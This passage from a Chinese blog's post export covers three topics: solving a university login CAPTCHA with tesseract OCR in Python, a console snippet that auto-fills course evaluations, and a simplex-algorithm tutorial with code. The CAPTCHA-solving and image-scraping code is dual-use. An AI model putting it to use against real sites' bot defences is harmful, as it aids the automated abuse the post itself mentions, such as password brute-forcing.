以及用tesseract -OCR识别验证码","slug":"introction-of-verification-code-and-using-tesseract-ocr-crack-verification-code","date":"2017-01-27T15:50:14.000Z","updated":"2021-01-08T13:42:14.095Z","comments":true,"path":"introction-of-verification-code-and-using-tesseract-ocr-crack-verification-code/","link":"","permalink":"https://www.hrwhisper.me/introction-of-verification-code-and-using-tesseract-ocr-crack-verification-code/","excerpt":"本文内容： 简单介绍验证码 用tesseract -OCR识别验证码","text":"本文内容： 简单介绍验证码 用tesseract -OCR识别验证码 现在验证码 简单的验证码比如如下： 百度的 当然也有比较不一样的验证码： 如知乎时让我们点击倒立的文字 比如geetest的滑动验证 比如12306的被人吐槽的变态验证码： 验证码的作用 验证码是一种较为粗暴的人机判别方式，通过识别提交的验证码是否正确来判断是否是正常的用户，而非机器。 那么有什么用呢？正常来说，对于一个WEB应用，正常的用户会按照操作的流程来使用功能。而总有一些“刁民” 会采用其他的方法，比如直接用程序来模拟自己的行为来得到某些便利。如：选课的时候进行刷课，看看有没有剩余，有的话就选上，毕竟一直盯着费时费力；还有刷票，比如春运 。还有恶意的用户通过枚举密码来暴力破解其它用户的密码…… 而有了验证码之后呢？你必须要能够准确的识别出验证码才能实现你的目的。比如你要用程序以枚举的方式暴力破解别人的 ，要是你的程序识别不出验证码，那么你就无法完成这项工作。 验证码主要原理 验证码是如何实现的呢？ 首先，可以生成随机的字符串,然后保持在session中，然后通过各种绘图方式将文字输出到图片上（可以假如扭曲、变形、旋转等干扰）。用户提交时，服务器端验证用户提交的验证码是否和session中一致，若不一致返回验证码错误。此外，可能用到AJAX进行验证码更新（如点击换个验证码） 简单的验证码破解 国科大教务处现在也有验证码了! 老实说，上面那个说刷课啥的就是我 (→_→) 现在有了验证码，登录不上去怎么办！ 下面以UCAS的教务处的密码为例，来介绍用OCR识别的方式来识别验证码。 UCAS的验证码 UCAS的验证码如下： 看上去挺简单的~ 经过观察发现，貌似只有小写和数字，然后看验证码2连两个r都长一样，说明其干扰其实挺弱的，就那么几种。 我们直接用OCR（Optical Character Recognition，光学字符识别）即可，比如google的tesseract-OCR 安装ocr windows下安装：http://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-setup-3.05.00dev.exe 安装时候勾选 Registry settings 安装后重起 Linux://github.com/tesseract-ocr/tesseract/wiki 使用 其使用方式简单，命令行为： tesseract a.png result 上述命令生成了result.txt文件，文件中为识别的结果 要在屏幕中直接输出呢？ tesseract a.png stdout python代码 只需要几行即可 123def image_to_string(img): res &#x3D; subprocess.check_output(&#39;tesseract &#39; + img + &#39; stdout&#39;).decode() return (re.subn(&#39;\\W&#39;, &#39;&#39;, res.strip()) if res else (&#39;&#39;, &#39;&#39;))[0].lower() 上述的代码使用了subprocess来调用tesseract，并获取返回结果。 由于tesseract-OCR识别可能有非字母非数字的（比如空格），我们用正则表达式去除，然后最后小写并返回。 提高识别率 上面简单的调用可能有的处理不是很好，如上面的第一个例子识别为zgta，我们希望能去除背景等来让整个验证码更加的干净，以便于识别。 于是先进行预处理，将其小于某个阈值的设为0，大于阈值的设为255,然后二值化，此外，把四周的黑框去除了。 这里使用了python的装饰器（这是一种添加新功能很好的设计模式）: 1234567891011121314151617181920212223242526import osimport reimport subprocessfrom PIL import Imagedevnull &#x3D; open(os.devnull, &#39;w&#39;)cut_size &#x3D; 1def pre_process(func): def _wrapper(filename): image &#x3D; Image.open(filename).point(lambda p: 255 if p &gt; 127 else 0).convert(&quot;1&quot;) w, h &#x3D; image.size image &#x3D; image.crop((cut_size, cut_size, w - cut_size, h - cut_size)) save_name &#x3D; filename + &#39;1.jpg&#39; image.save(save_name) res &#x3D; func(save_name) os.remove(save_name) return res return _wrapper@pre_processdef image_to_string(img): res &#x3D; subprocess.check_output(&#39;tesseract &#39; + img + &#39; stdout&#39;, stderr&#x3D;devnull).decode() # tesseract a.png result return (re.subn(&#39;\\W&#39;, &#39;&#39;, res.strip()) if res else (&#39;&#39;, &#39;&#39;))[0].lower() 现在我们可以正确的第一个样例啦。 处理后效果如下: 测试识别率 为了能更好的测试，于是使用如下的代码下载200张图，然后进行人工标注 123456789101112def download_verification_code(save_name): r = requests.get(&#x27;http://sep.ucas.ac.cn/changePic&#x27;, stream=True) with open(&#x27;./img/&#x27;+save_name+&#x27;.jpg&#x27;, &#x27;wb&#x27;) as f: for chunk in r.iter_content(chunk_size=1024): if chunk: # filter out keep-alive new chunks f.write(chunk) f.flush()if __name__ == &#x27;__main__&#x27;: for i in range(200): print(i) download_verification_code(str(i)) 测试代码如下： 123456789101112131415161718192021import osfrom ocr_test import image_to_string as img2str1from MyOCR import image_to_string as img2str2from multiprocessing import Pooldef judge(name): target = name.split(&#x27;.&#x27;)[0] predict1 = img2str1(&#x27;./img/&#x27; + name) # pre predict2 = img2str2(&#x27;./img/&#x27; + name) return [predict1 == target, predict2 == target]if __name__ == &#x27;__main__&#x27;: files = next(os.walk(&#x27;./img/&#x27;))[2] with Pool(3) as pool: res = pool.map(judge, files) total = len(files) c1 = sum([x[0] for x in res]) c2 = sum([x[1] for x in res]) print(c1, c1 / total) # 70 0.35 print(c2, c2 / total) # 63 0.315 可以看出有预处理的提升了不少。 小结 上面我们偷懒使用tesseract-OCR，得到了33%左右的正确率。 其实可以通过简单的训练应该就可以很好的正确率，因为标注的时候发现很多字母或者数字是长一样的。 PS: 登录脚本的话可以进行优化，比如识别的需要4个字母或者数字，如果不是就重新获取验证码，这样能减少服务器说验证码错误的次数。 目前登录成功一次平均需要2.6次的尝试，还算可以。 其它 自动下课件项目介绍 UCAS 课件自动下载脚本(github) UCAS刷课脚本(github)","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"计算机基础","slug":"study/计算机基础","permalink":"https://www.hrwhisper.me/categories/study/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"国科大 UCAS 自动评价课程、教师","slug":"ucas-auto-comment-course-script","date":"2016-12-26T00:57:27.000Z","updated":"2020-10-19T14:35:48.831Z","comments":true,"path":"ucas-auto-comment-course-script/","link":"","permalink":"https://www.hrwhisper.me/ucas-auto-comment-course-script/","excerpt":"国科大评价课程有二十多个勾，没有评价又看不到成绩，然后又很懒怎么办~","text":"国科大评价课程有二十多个勾，没有评价又看不到成绩，然后又很懒怎么办~ 如下图：一共有二十几个，然后又有好多门课 代码 通过分析网页的源代码，发现只需要两行代码，然后就可以把那20多个框一下全部选中了。 下面的代码将所有的都选项选了优： 12var tds &#x3D; document.getElementsByTagName(&#39;td&#39;);for(var i &#x3D; 0; i&lt;tds.length;i++) tds[i].getElementsByTagName(&quot;input&quot;)[0].checked&#x3D;true; 如果要全部评价为良，那么(\"input\")[0].checked=true; 中的0改为1，若为合格则2，差则3 使用方法 打开课程评价的页面，进入要评价的课程，然后按F12调出chrome的控制台，在下方的标签选Console，然后粘贴上面的代码按回车即可。 其它 虽然没有评价也能看到成绩，在学籍管理-档案管理-档案操作查询-成绩登记表c1中查看没有评价的成绩，但是微信上那个学生处的就不能用啦，所以还是评价一下把~","categories":[{"name":"技术改变生活","slug":"技术改变生活","permalink":"https://www.hrwhisper.me/categories/%E6%8A%80%E6%9C%AF%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB/"},{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"}],"tags":[]},{"title":"线性规划-单纯形算法详解","slug":"introduction-to-simplex-algorithm","date":"2016-11-24T09:10:10.000Z","updated":"2020-10-31T13:15:47.561Z","comments":true,"path":"introduction-to-simplex-algorithm/","link":"","permalink":"https://www.hrwhisper.me/introduction-to-simplex-algorithm/","excerpt":"本文将详细的介绍单纯形算法，包括但不限于 LP问题 单纯形算法原理 无界、无解、循环等情况 python代码实现","text":"本文将详细的介绍单纯形算法，包括但不限于 LP问题 单纯形算法原理 无界、无解、循环等情况 python代码实现 线性规划问题 首先引入如下的问题： 假设食物的各种营养成分、价格如下表： Food Energy（能量） Protein（蛋白质） Calcium（钙） Price Oatmeal（燕麦） 110 4 2 3 Whole milk（全奶） 160 8 285 9 Cherry pie（草莓派） 420 4 22 20 Pork with beans（猪肉） 260 14 80 19 要求我们买的食物中，至少要有2000的能量，55的蛋白质，800的钙，怎样买最省钱？ 设买燕麦、全奶、草莓派、猪肉为\\(x_1,x_2,x_3,x_4~\\) 于是我们可以写出如下的不等式组 example_for_introduction_to_linear_programming_formulation.png 其实这些不等式组就是线性规划方程（Linear programming formulation）。 简单的说，线性规划就是在给定限制的情况下，求解目标。 可行域 来看一个算法导论中的例子，考虑如下的线性规划： \\[ \\begin{alignat}{2} \\max\\quad &amp;x_1 + x_2&amp; \\\\ \\mbox{s.t.}\\quad &amp;4x_1 - x_2 &amp;\\leq&amp;{8} \\\\ &amp;2x_1 + x_2 &amp; \\leq&amp;{10}\\\\ &amp;5x_1 - 2x_2 &amp; \\geq&amp;{-2}\\\\ &amp;x_1, \\quad x_2 &amp;\\geq&amp;{0} \\\\ \\end{alignat} \\] 我们可以画出下面的图： example_for_feasible_region 看图a，灰色的区域就是这几个约束条件要求\\(x_1,x_2\\)所在的区域，而我们最后的解\\(x_1,x_2\\)也要在这里面。我们把这个区域称为可行域（feasible region） 图b可以直观的看出，最优解为8, 而 \\(x_1=2,x_2=6\\) 线性规划标准形式 线性规划的标准形式如下： \\[ \\begin{alignat}{2} \\min\\quad &amp;&amp;&amp;&amp;c^Tx&amp; \\\\ \\mbox{s.t.}\\quad &amp; &amp;A&amp;x &amp;\\leq{b}\\\\ &amp; &amp;&amp;x &amp; \\geq{0} &amp;\\\\ \\end{alignat} \\] 就是 求的是min（算法导论的是max，本文为min） 所有的约束为&lt;=的形式 所有的变量均 &gt;=0 如何变为标准形式？ 原来是max, 直接*-1求min 若原来约束为=，转为 &gt;= 和&lt;= 约束原来为 &gt;= 同样的*-1，就改变了&lt;= 若有变量 \\(x_i &lt; 0\\) ，那么用 \\(x^{&#39;} - x^{&#39;&#39;}\\)来替代，其中 \\(x^{&#39;}&gt;=0, x^{&#39;&#39;}&gt;=0\\) 线性规划松弛形式 松弛形式为: \\[ \\begin{alignat}{2} \\min\\quad &amp;&amp;&amp;&amp;c^Tx&amp; \\\\ \\mbox{s.t.}\\quad &amp; &amp;A&amp;x &amp;={b}\\\\ &amp; &amp;&amp;x &amp; \\geq{0} &amp;\\\\ \\end{alignat} \\] 就是通过引入变量把原来的 &lt;= ，变为=的松弛形式. 如： \\[ \\begin{alignat}{2} &amp;x_1 + x_2 &amp;\\leq{2} \\\\ &amp;x_1 + x_2 &amp; \\geq{1}\\\\ &amp;x_1, \\quad x_2 &amp;\\geq{0} &amp;\\\\ \\end{alignat} \\] 写为松弛形式就是： \\[ \\begin{alignat}{2} &amp;x_1 + x_2 + x_3&amp;={2} \\\\ &amp;x_1 + x_2 + x_4&amp; ={1}\\\\ &amp;x_1,x_2,x_3,x_4 &amp;\\ge{0} &amp;\\\\ \\end{alignat} \\] &lt;= vs &lt; 有砸场子的同学会问(╯‵□′)╯︵┻━┻，为什么我们的线性规划的形式都是可以 &lt;= 或者 &gt;=的形式的？把等号去掉可以么？ 就是不可以(￣ε(#￣) 举个例子 \\[ \\begin{alignat}{2} \\max\\quad &amp;x&amp; \\\\ \\mbox{s.t.}\\quad &amp; x \\leq{1}&amp;\\\\ \\end{alignat} \\] \\[ \\begin{alignat}{2} \\max\\quad &amp;x&amp; \\\\ \\mbox{s.t.}\\quad &amp; x \\lt{1}&amp;\\\\ \\end{alignat} \\] 显然第二个是无解的。 单纯形算法的思想与例子 如何求解线性规划问题呢？ 有一些工具如GLPK，Gurobi 等，不在本文的介绍范围内。 本文要介绍的是单纯形算法，它是求解线性规划的经典方法，虽然它的执行时间在最坏的情况下是非多项式的（指数时间复杂度），但是，在绝大部分情况下或者说实际运行过程中却是多项式时间。 它主要就三个步骤 找到一个初始的基本可行解 不断的进行旋转（pivot）操作 重复2直到结果不能改进为止 以下面的线性规划为例: \\[ \\begin{array}{rrrrrr} \\min &amp; -x_1 &amp;-&amp;14x_2 &amp;-&amp;6x_3\\\\ s.t. &amp;x_1&amp; +&amp;x_2&amp; +&amp;x_3 &amp;\\le &amp;\\quad4\\\\ &amp;x_1&amp; &amp;&amp; &amp; &amp;\\le &amp;\\quad2\\\\ &amp;&amp; &amp;&amp; &amp; x_3&amp;\\le &amp;\\quad3\\\\ &amp;&amp; &amp;3x_2&amp; +&amp;x3 &amp;\\le &amp;\\quad6\\\\ &amp;x_1&amp; ,&amp;x_2&amp;,&amp;x3 &amp;\\ge &amp;\\quad0\\\\ \\end{array} \\] 将其写为松弛的形式： \\[ \\begin{alignat}{2} \\min\\quad &amp;-x_1 -14x_2 - 6x_3&amp; \\\\ \\mbox{s.t.}\\quad &amp;x_1 + x_2 +x_3 + x_4 \\quad \\quad \\quad \\quad \\quad \\quad \\quad &amp;=&amp; \\quad4&amp;\\\\ &amp;x_1 \\quad \\quad \\quad \\quad \\quad \\quad \\quad+x_5 \\quad \\quad\\quad \\quad\\quad&amp;=&amp;\\quad2&amp;\\\\ &amp; \\quad\\quad \\quad \\quad\\quad x_3 + \\quad \\quad \\quad \\quad + x_6&amp;=&amp;\\quad3&amp;\\\\ &amp; \\quad \\quad 3x_2 + x_3\\quad\\quad \\quad \\quad\\quad \\quad \\quad +x_7&amp;=&amp;\\quad6&amp;\\\\ &amp;x_1, \\quad x_2 ,\\quad x_3, \\quad x_4, \\quad x_5 ,\\quad x_6, \\quad x_7\\quad &amp;\\quad\\geq{0} &amp;\\\\ \\end{alignat} \\] 其实，就是等价于（仍然要求 \\(x_1,x_2,x_3,x_4,x_5,x_6,x_7 \\ge0\\)）： \\[ \\begin{alignat}{4} &amp;z = \\quad-x_1 -14x_2 - 6x_3&amp; \\\\ &amp; x_4 = \\quad4-x_1 - x_2 -x_3 &amp;\\\\ &amp;x_5 =\\quad2 - x_1&amp;\\\\ &amp;x_6=\\quad3 - x_3&amp;\\\\ &amp; x_7=\\quad6 - 3x_2 - x_3&amp;\\\\ \\end{alignat} \\] 在上述的等式的左边称为基本变量，而右边称为非基本变量。 现在来考虑基本解就是把等式右边的所有非基本变量设为0，然后计算左边基本变量的值。 这里，容易得到基本解为： \\((x_1,x_2,x_3,x_4,x_5,x_6,x_7) = (0,0,0,4,2,3,6)\\)，而目标值z = 0，其实就是把基本变量\\(x_i\\)设置为\\(b_i\\)。 一般而言，基本解是可行的，我们称其为基本可行解。初始的基本解不可行的情况见后面的讨论，这里假设初始的基本解就是基本可行解，因此三个步骤中第一步完成了。 现在开始，来讨论上面的第二个步骤，就是旋转的操作。 我们每次选择一个在目标函数中的系数为负的非基本变量\\(x_e\\)，然后尽可能的增加\\(x_e\\)而不违反约束，并将\\(x_e\\)用基本变量\\(x_l\\)表示， 然后把\\(x_e\\)变为基本变量，\\(x_l\\)变为非基本变量。 这里，假设我们选择增加\\(x_1\\)，那么在上述的等式（不包括目标函数z那行）中，第1个等式限制了\\(x_1 \\le 4\\)(因为\\(x_4 \\ge 0\\))，第2个等式有最严格的限制，它限制了\\(x_1 \\le 2\\)，因此我们最多只能将\\(x_1\\)增加到2，根据上面的第二个等式，我们有：\\(x_1 = 2- x_5\\)，带入上面的等式就实现了\\(x_e\\)和\\(x_l\\)的替换： \\[ \\begin{alignat}{4} &amp;z = \\quad-2 -14x_2 - 6x_3 + x_5&amp; \\\\ &amp; x_4 = \\quad2 - x_2 -x_3 +x_5&amp;\\\\ &amp;x_1 =\\quad2 - x_5&amp;\\\\ &amp;x_6=\\quad3 - x_3&amp;\\\\ &amp; x_7=\\quad6 - 3x_2 - x_3&amp;\\\\ \\end{alignat} \\] 这样其实就是一个转动(pivot)的过程，一次转动选取一个非基本变量（也叫替入变量）\\(x_e\\)和一个基本变量（也叫替出变量) \\(x_l\\) ，然后替换二者的角色。执行一次转动的过程与之前所描述的线性规划是等价的。 同样的，将非基本变量设为0，于是得到：\\((x_1,x_2,x_3,x_4,x_5,x_6,x_7) = (2,0,0,2,0,3,6)\\)， Z = -2，说明我们的目标减少到了-2 接下来是单纯形算法的第三步，就是不断的进行转动，直到无法进行改进为止，继续看看刚才的例子： 我们接着再执行一次转动，这次我们可以选择增大\\(x_2\\)或者\\(x_3\\)，而不能选择\\(x_5\\)，因为增大\\(x_5\\)之后，z也增大，而我们要求的是最小化z。假设选择了\\(x_2\\)，那么第1个等式限制了\\(x_2 &lt;=2\\) , 第4个等式限制了\\(x_2&lt;= 2\\)，假设我们选择\\(x_4\\)替出变量，于是有： \\(x_2 = 2-x_3-x_4+x_5\\) ，带入得： \\[ \\begin{alignat}{4} &amp;z = \\quad-30 + 8x_3 + 14x_4 -13x_5&amp; \\\\ &amp; x_2 = \\quad2 -x_3 -x_4 +x_5&amp;\\\\ &amp;x_1 =\\quad2 - x_5&amp;\\\\ &amp;x_6=\\quad3 - x_3&amp;\\\\ &amp; x_7=\\quad2x_3 + 3x_4 - 3x_5&amp;\\\\ \\end{alignat} \\] 此时，我们的基本解变为\\((x_1,x_2,x_3,x_4,x_5,x_6,x_7) = (2,2,0,0,0,3,0)\\)， Z = -30 我们可以继续的选择增大\\(x_5\\)，第4个等式具有最严格的限制（\\(0 - 3x_5 &gt;=0\\)），我们有\\(x_5=\\frac{2}{3}x_3 + x_4 - \\frac{1}{3}x_7\\) 带入得： \\[ \\begin{alignat}{4} &amp;z = \\quad-30 - \\frac{2}{3}x_3 + x_4 +\\frac{13}{3}x_7&amp; \\\\ &amp; x_2 = \\quad2 - \\frac{1}{3}x_3 -\\frac{1}{3}x_7&amp;\\\\ &amp;x_1 =\\quad2 - \\frac{2}{3}x_3 - x_4 + \\frac{1}{3}x_7&amp;\\\\ &amp;x_6=\\quad3 - x_3&amp;\\\\ &amp; x_5=\\quad\\frac{2}{3}x_3 + x_4 - \\frac{1}{3}x_7&amp;\\\\ \\end{alignat} \\] 此时，我们的基本解变为\\((x_1,x_2,x_3,x_4,x_5,x_6,x_7) = (2,2,0,0,0,3,0)\\)， Z = -30，这时候并没有增加，但是下一步，我们可以选择增加 \\(x_3\\)。第2个和第3个有最严格的限制，我们选第2个的话，得：\\(x_3=3 - \\frac{3}{2}x_1 - \\frac{3}{2}x_4 + \\frac{1}{2}x_7\\)，然后老样子，继续带入： \\[ \\begin{alignat}{4} &amp;z = \\quad-32 + x_1 + 2x_4 + 4x_7&amp; \\\\ &amp; x_2 = \\quad1 + \\frac{1}{2}x_1 +\\frac{1}{2}x_4 - \\frac{1}{2}x_7&amp;\\\\ &amp;x_3= \\quad3 - \\frac{3}{2}x_1 - \\frac{3}{2}x_4 + \\frac{1}{2}x_7&amp;\\\\ &amp;x_6=\\quad \\frac{3}{2}x_1 + \\frac{3}{2}x_4 - \\frac{1}{2}x_7&amp;\\\\ &amp; x_5=\\quad 2 - x_1&amp;\\\\ \\end{alignat} \\] 现在，已经没有可以继续增大的值了，停止转动，z=-32就是我们的解，而此时，基本解为：\\((x_1,x_2,x_3,x_4,x_5,x_6,x_7) = (0,1,3,0,2,0,0)\\)，看看最开始的目标函数：\\(z = -x_1 - 14x_2 - 6x_3\\),我们将\\(x_2=1,x_3=3\\)带入得，z=-32，说明我们经过一系列的旋转，最后得到了目标值。 退化(Degeneracy) 在旋转的过程中，可能会存在保持目标值不变的情况，这种现象称为退化。比如上面的例子中，两次等于-30. 可以说退化可能会导致循环(cycling)的情况，这是使得单纯形算法不会终止的唯一原因。还好上面的例子中，我们没有产生循环的情况，再次旋转，目标值继续降低。 《算法导论》是这样介绍退化产生循环的： Degeneracy can prevent the simplex algorithm from terminating, because it can lead to a phenomenon known as cycling: the slack forms at two different iterations of SIMPLEX are identical. Because of degeneracy, SIMPLEX could choose a sequence of pivot operations that leave the objective value unchanged but repeat a slack form within the sequence. Since SIMPLEX is a deterministic algorithm, if it cycles, then it will cycle through the same series of slack forms forever, never terminating. 如何避免退化？一个方法就是使用Bland规则： 在选择替入变量和替出变量的时候，我们总是选择满足条件的下标最小值。 替入变量\\(x_e\\)：目标条件中，系数为负数的第一个作为替入变量 替出变量\\(x_l\\)：对所有的约束条件中，选择对\\(x_e\\)约束最紧的第一个 在上面的例子中，我也是这么做的。^ ^ 另一个方法是加入随机扰动。 无界(unbounded)的情况 有的线性规划问题是无界的，举个栗子 for example 对于下面的线性规划 \\[ \\begin{alignat}{2} \\min\\quad &amp;-x_1 - x_2&amp; \\\\ \\mbox{s.t.}\\quad &amp;x_1 - x_2 &amp;\\leq{1} \\\\ -&amp;x_1 + x_2 &amp; \\leq{1}\\\\ &amp;x_1, \\quad x_2 &amp;\\geq{0} &amp;\\\\ \\end{alignat} \\] 画出区域为： example_for_unbounded_case 显然可以不断的增大。让我们来看看单纯形算法是如何应对的： 上述的写成松弛形式为： \\[ \\begin{alignat}{2} \\min\\quad &amp;-x_1 - x_2&amp; \\\\ \\mbox{s.t.}\\quad &amp;x_1 - x_2 + &amp;x_3 &amp;&amp;={1} \\\\ -&amp;x_1 + x_2 &amp;&amp;+x_4&amp; ={1}\\\\ &amp;x_1, x_2,x_3, x_4 \\geq{0} &amp;\\\\ \\end{alignat} \\] 也就是， \\[ \\begin{alignat}{2} &amp;z &amp;=&amp;-x_1 - x_2&amp;\\\\ &amp; x_3 &amp;=&amp; 1 - x_1 + x_2&amp; \\\\ &amp;x_4 &amp;=&amp;1 + x_1 - x_2 &amp; \\\\ \\end{alignat} \\] 选择x_1 为替入变量，x_3为替出变量，有： \\[ \\begin{alignat}{2} &amp;z &amp;=&amp;-1 - 2x_2 + x_3&amp;\\\\ &amp; x_1 &amp;=&amp; 1 + x_2 - x_3&amp; \\\\ &amp;x_4 &amp;=&amp;2 - x_3 &amp; \\\\ \\end{alignat} \\] 这时候我们只能选择\\(x_2\\) 为替入变量,才能使得目标值变小，但是我们发现，对于\\(x_2\\)没有任何的约束，也就是说，\\(x_2\\)可以无限大，所以这是没有边界的情况。 这个情况是我们有一个替入变量，但是找不到一个替出变量导致的，这时候就是无界的情况了，写算法的时候注意判断一下即可。 单纯形算法的具体实现 说了那么多，代码怎么写呢？ 看一下最开始的线性规划的问题（已经是松弛形式）： \\[ \\begin{alignat}{2} \\min\\quad &amp;-x_1 -14x_2 - 6x_3&amp; \\\\ \\mbox{s.t.}\\quad &amp;x_1 + x_2 +x_3 + x_4 \\quad \\quad \\quad \\quad \\quad \\quad \\quad &amp;=&amp; \\quad4&amp;\\\\ &amp;x_1 \\quad \\quad \\quad \\quad \\quad \\quad \\quad+x_5 \\quad \\quad\\quad \\quad\\quad&amp;=&amp;\\quad2&amp;\\\\ &amp; \\quad\\quad \\quad \\quad\\quad x_3 + \\quad \\quad \\quad \\quad + x_6&amp;=&amp;\\quad3&amp;\\\\ &amp; \\quad \\quad 3x_2 + x_3\\quad\\quad \\quad \\quad\\quad \\quad \\quad +x_7&amp;=&amp;\\quad6&amp;\\\\ &amp;x_1, \\quad x_2 ,\\quad x_3, \\quad x_4, \\quad x_5 ,\\quad x_6, \\quad x_7\\quad &amp;\\quad\\geq{0} &amp;\\\\ \\end{alignat} \\] 我们可以得到下面的矩阵： \\[ \\begin{equation} %开始数学环境 C = \\left( %左括号 \\begin{array}{c} -1 &amp; -14 &amp; -6&amp; 0 &amp;0 &amp;0 &amp;0\\\\ %第一行元素 \\end{array} \\right) %右括号 \\\\ \\quad \\\\ B =\\left( \\begin{array}{c} 4\\\\ 2\\\\ 3\\\\ 6\\\\ \\end{array} \\right) \\quad A =\\left( %左括号 \\begin{array}{c} %c为居中放置 1 &amp; 1 &amp; 1&amp; 1 &amp;0 &amp;0 &amp;0\\\\ %第一行元素 1 &amp; 0 &amp; 0&amp; 0 &amp;1 &amp;0 &amp;0\\\\ %第二行元素 0 &amp; 0 &amp; 1&amp; 0 &amp;0 &amp;1 &amp;0\\\\ %第三行元素 0 &amp; 3 &amp; 1&amp; 0 &amp;0 &amp;0 &amp;1\\\\ %第四行元素 \\end{array} \\right) %右括号 \\end{equation} \\] 矩阵A：就是约束条件的系数（等号左边的系数） 矩阵B：就是约束条件的值（等号右边） 矩阵C：目标函数的系数值 我们将其拼接起来： \\[ \\begin{equation} %开始数学环境 S_1 = \\left( \\begin{array}{r} 0&amp; -1 &amp; -14 &amp; -6&amp; 0 &amp;0 &amp;0 &amp;0\\\\ 4&amp; 1 &amp; 1 &amp; 1&amp; 1 &amp;0 &amp;0 &amp;0\\\\ 2&amp;1 &amp; 0 &amp; 0&amp; 0 &amp;1 &amp;0 &amp;0\\\\ 3&amp;0 &amp; 0 &amp; 1&amp; 0 &amp;0 &amp;1 &amp;0\\\\ 6&amp;0 &amp; 3 &amp; 1&amp; 0 &amp;0 &amp;0 &amp;1\\\\ \\end{array} \\right) \\end{equation} \\] 左下角为B，右上角为C，右下角为A，那么左上角呢？我们放的是-z，初始时-z = 0！ 将上面那个矩阵和写成 基本变量 = 非基本变量的形式对比： \\[ \\begin{alignat}{4} &amp;z = \\quad-x_1 -14x_2 - 6x_3&amp; \\\\ &amp; x_4 = \\quad4-x_1 - x_2 -x_3 &amp;\\\\ &amp;x_5 =\\quad2 - x_1&amp;\\\\ &amp;x_6=\\quad3 - x_3&amp;\\\\ &amp; x_7=\\quad6 - 3x_2 - x_3&amp;\\\\ \\end{alignat} \\] 我们发现，对于B、C就是一样的，而A取决于基本变量和非基本变量，非基本变量符号相反，基本变量符号相同。 接着以最开始的线性规划求解过程的第二步为例，来看看我们的矩阵是如何进行运算的，第二步我们的结果如下（我们选择了\\(x_1\\)为替入变量，\\(x_5\\)为替出变量）： \\[ \\begin{alignat}{4} &amp;z = \\quad-2 -14x_2 - 6x_3 + x_5&amp; \\\\ &amp; x_4 = \\quad2 - x_2 -x_3 +x_5&amp;\\\\ &amp;x_1 =\\quad2 - x_5&amp;\\\\ &amp;x_6=\\quad3 - x_3&amp;\\\\ &amp; x_7=\\quad6 - 3x_2 - x_3&amp;\\\\ \\end{alignat} \\] 首先看看约束条件的式子，\\(x_1 = 2 - x_5\\)我们改写成： \\(2 = x_1 + x_5\\) , 因此这行矩阵就是： (b,a1,a2.....a7) = (2,1,0,0,0,1,0,0)，其它的类推，注意-z，因此我们的矩阵应该是如下形式的： \\[ \\begin{equation} S_2 = \\left( \\begin{array}{c} 2&amp; 0 &amp; -14 &amp; -6&amp; 0 &amp;1 &amp;0 &amp;0\\\\ 2&amp; 0 &amp; 1 &amp; 1&amp; 1 &amp;-1 &amp;0 &amp;0\\\\ 2&amp; 1 &amp; 0 &amp; 0&amp; 0 &amp;1 &amp;0 &amp;0\\\\ 3&amp; 0 &amp; 0 &amp; 1&amp; 0 &amp;0 &amp;1 &amp;0\\\\ 6&amp; 0 &amp; 3 &amp; 1&amp; 0 &amp;0 &amp;0 &amp;1\\\\ \\end{array} \\right) \\end{equation} \\] OK，那么\\(S_1\\) 如何变成\\(S_2\\)的？ 首先是第2行，我们是将 \\(x_1\\)用\\(x_5\\)表示(\\(x_1= x_5\\))，在等式的变换中，就是移项，然后每一个都除以\\(x_1\\)的系数。其实用矩阵很简单，这里就是mat[2] /= mat[2][1] ，表示矩阵第二行都除以第二行第一个元素 其它行呢？只要有\\(x_1\\)的，我们都用\\(x_1 = 2- x_5\\)来表示，就是其它行的\\(x_1\\)的系数 * mat[2]，然后相减，mat[i]= mat[i] - mat[2] * mat[i][1] ,这样就实现了约束条件中替入和替出变量的替换！比如第一行，就是mat[1] = mat[1] - mat[2] * 1变成两行直接相减 现在来看目标函数，对于目标函数，我们也是将\\(x_1\\)用 \\(2 - x_5\\)来表示，参照上面的思路，同样的减法：mat[0] = mat[0] - mat[2] * -1 = mat[0] + mat[2]。注意到我们的其实我们的z = -2，而左上角的为 2，也就是-z，这就是我们为啥说左上角是-z的原因。 用矩阵的形式来表示后，可以写出simplex beta0.99代码（去除版权信息、空行等，只需要21行！）： 12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-# @Date : 2016/11/17# @Author : hrwhisperimport numpy as npclass Simplex(object): def __init__(self, obj, max_mode=False): self.max_mode = max_mode # default is solve min LP, if want to solve max lp,should * -1 self.mat = np.array([[0] + obj]) * (-1 if max_mode else 1) def add_constraint(self, a, b): self.mat = np.vstack([self.mat, [b] + a]) def solve(self): m, n = self.mat.shape # m - 1 is the number slack variables we should add temp, B = np.vstack([np.zeros((1, m - 1)), np.eye(m - 1)]), list(range(n - 1, n + m - 1)) # add diagonal array mat = self.mat = np.hstack([self.mat, temp]) # combine them! while mat[0, 1:].min() &lt; 0: col = np.where(mat[0, 1:] &lt; 0)[0][0] + 1 # use Bland&#x27;s method to avoid degeneracy. use mat[0].argmin() ok? row = np.array([mat[i][0] / mat[i][col] if mat[i][col] &gt; 0 else 0x7fffffff for i in range(1, mat.shape[0])]).argmin() + 1 # find the theta index if mat[row][col] &lt;= 0: return None # the theta is ∞, the problem is unbounded mat[row] /= mat[row][col] ids = np.arange(mat.shape[0]) != row mat[ids] -= mat[row] * mat[ids, col:col + 1] # for each i!= row do: mat[i]= mat[i] - mat[row] * mat[i][col] B[row] = col return mat[0][0] * (1 if self.max_mode else -1), &#123;B[i]: mat[i, 0] for i in range(1, m) if B[i] &lt; n&#125; 一个调用的例子： &quot;&quot;&quot; minimize -x1 - 14x2 - 6x3 st x1 + x2 + x3 &lt;=4 x1 &lt;= 2 x3 &lt;= 3 3x2 + x3 &lt;= 6 x1 ,x2 ,x3 &gt;= 0 answer :-32 &quot;&quot;&quot; t = Simplex([-1, -14, -6]) t.add_constraint([1, 1, 1], 4) t.add_constraint([1, 0, 0], 2) t.add_constraint([0, 0, 1], 3) t.add_constraint([0, 3, 1], 6) print(t.solve()) print(t.mat) 